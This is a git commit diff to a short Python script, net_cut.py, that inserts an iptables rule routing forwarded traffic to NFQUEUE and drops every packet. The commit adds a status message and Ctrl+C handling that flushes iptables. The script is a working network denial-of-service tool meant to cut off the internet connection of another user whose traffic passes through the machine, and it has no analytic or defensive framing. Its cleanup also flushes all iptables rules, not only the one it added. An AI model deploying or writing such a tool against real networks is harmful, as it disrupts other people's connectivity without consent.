7a2abfa1b22816f92dd0c2b01659f051237e8eeb
Avish Dhirawat <31956212+Avishdhirawat0@users.noreply.github.com>
2020-07-22 16:30:45 +0530

    Add files via upload

--- net_cut.py
+++ net_cut.py
@@ -9,13 +9,18 @@ import subprocess
 subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)
 
 def process_packet(packet):
+    print("[+] Cutting the internet connection........")
     print(packet)
     #packet.accept() # Used to forward the packets to the client
     packet.drop() # Cut the internet connection of the client
 
-queue = netfilterqueue.NetfilterQueue()
-# iptables -I FORWARD -j NFQUEUE --queue-num 0
-queue.bind(0, process_packet) # 0 is queue number/id that we given in above command while storing the iptable to a queue.
-queue.run()
-# iptables --flush to delete the iptables we created
-subprocess.call("iptables --flush", shell = True)
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    # iptables -I FORWARD -j NFQUEUE --queue-num 0
+    queue.bind(0, process_packet) # 0 is queue number/id that we given in above command while storing the iptable to a queue.
+    queue.run()
+
+except KeyboardInterrupt:
+    print("[-] Detected CTRL + C .... Exiting.....")
+    # iptables --flush to delete the iptables we created
+    subprocess.call("iptables --flush", shell = True)
